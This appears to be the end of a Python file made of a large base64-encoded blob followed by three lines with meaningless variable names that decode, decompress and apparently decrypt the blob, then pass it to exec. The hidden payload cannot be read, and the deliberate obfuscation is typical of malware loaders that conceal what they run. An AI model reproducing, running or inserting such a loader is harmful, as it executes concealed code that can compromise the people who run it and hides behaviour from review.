es6Zvc1b+jcolrOjXJWmFEXR/BY3VNdskn7sXwJEAEnPkQB78dmRmtP0NnVW+KmJbGE4eKBTBCupvcK6ESjH1VvhQ1jP0Sfk5v5j9ktctPmo2h1qVqqV9XuJa0/lWqX6uK9tNm/grp0BER43zQK/F5PP+E9P2e0zY5yfM5sJ/JFVbu70gnkLhSoFFW0g1S6eCoZmKWCbKaPjv6H3EXXy63y9DWsEn/SS405zbf1bud1bkYVwRSGSXQH6Q7MQ6lG4Sypz52nO/n79JVsaezpUqVuNeWufR35ZLK5ENpam1JXZz9MgqehH1wqQcU1hAK0nFNGE7GDb6mOh6V3EoEmd2+sCsQwIGbhMgR3Ky+uVKqI0Kg4FCss1ndTWrjMMDxT7Mlp9qM8GhOsKE/sK3+eYPtO0KHDAQ0PVal+hi2TnEq3GfMRem+aDfwtIB3lXwnsCZq7GXaacmVTCZEMUMKAKtUEJwA4AmO1Ah4dmTmVdqYowSkrGeVyj6IMUzk1UWkCRZeMmejB5bXHwEvpJjz8cM9dAefp/ildblVBaDwQpmCbodHqETv+EKItjREoV90/wcilISl0Vo9Sq6+QB94mkHmfPAGu8ZH+5U61NJWu1wn9OLCKWAzeqO6YvPODCH+bloVB1rI6HYUPFW0qtJbNgYANdDrlwn4jDrMAerwtz8thJcKxqeYXB/16F7D4CQ/pT9Iiku73Az+ETIc+NDsfNxxIiwI9VSiWhi8yvZ9pSQ/LR4WKvz4j+GRqF6TSM9BOUzgDpMcAbJg88A6gPdHfmdbpfJz/k7BJC8XiAf2VTVaqm6g05eWKYizM6+MN4AIdfxsYoJgpRaveh8qPygw+tyCd/vKOKh5jXQ0ZZ3ZN5BWtai9xJu2Cwe229bGryJOjix2rOaqfbTzfevns2dTDwUWrhk8zmlw0oIJuj+9HeSJPtjc2X2xYW0+tr/+69dnTry+/aSNP3KdUyBSwRB2xZZ4HAAVUhxZQrpWVKzaiqpXPjumeZPrnbnTpVKQ6iQOmk+/GD4/dIvTaljhQmjJOF2snSZkvRypX7nvtOkMF/WBpIZEg/T0s7XpM2msPdarYz4FIrpCAHlCq8agky4af/Jkh/ingqt60LCRqWU0xbYIG8EqVKGR0/gFkGhSN'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
